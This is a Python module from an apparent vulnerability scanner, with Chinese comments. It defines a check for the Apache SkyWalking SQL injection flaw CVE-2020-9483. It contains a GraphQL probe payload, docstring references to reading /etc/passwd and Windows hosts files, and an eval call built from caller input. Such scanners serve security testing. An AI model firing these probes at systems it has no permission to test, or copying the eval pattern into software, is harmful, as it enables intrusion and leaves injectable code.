#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Apache SkyWalking是阿帕奇的一款主要用于微服务、云原生和基于容器等环境的应用程序性能监视器
    Apache SkyWalking扫描类: 
        1. SkyWalking SQL注入
            CVE-2020-9483
                Payload: https://vulhub.org/#/environments/skywalking/8.3.0-sqli/

file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.thread import thread
from payloads.ApacheSkyWalking.cve_2020_9483 import cve_2020_9483_scan

class ApacheSkyWalking():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ApacheSkyWalking'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2020_9483_payloads = [
            {
                'path': 'graphql',
                'data': '''{
    "query":"query queryLogs($condition: LogQueryCondition) {
  queryLogs(condition: $condition) {
    total
    logs {
      serviceId
      serviceName
      isError
      content
    }
  }
}
",
    "variables":{
        "condition":{
            "metricName":"sqli",
            "state":"ALL",
            "paging":{
                "pageSize":10
            }
        }
    }
}'''
            },
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2020_9483_scan, url=url)
        ]

ApacheSkyWalking.cve_2020_9483_scan = cve_2020_9483_scan

skywalking = ApacheSkyWalking()
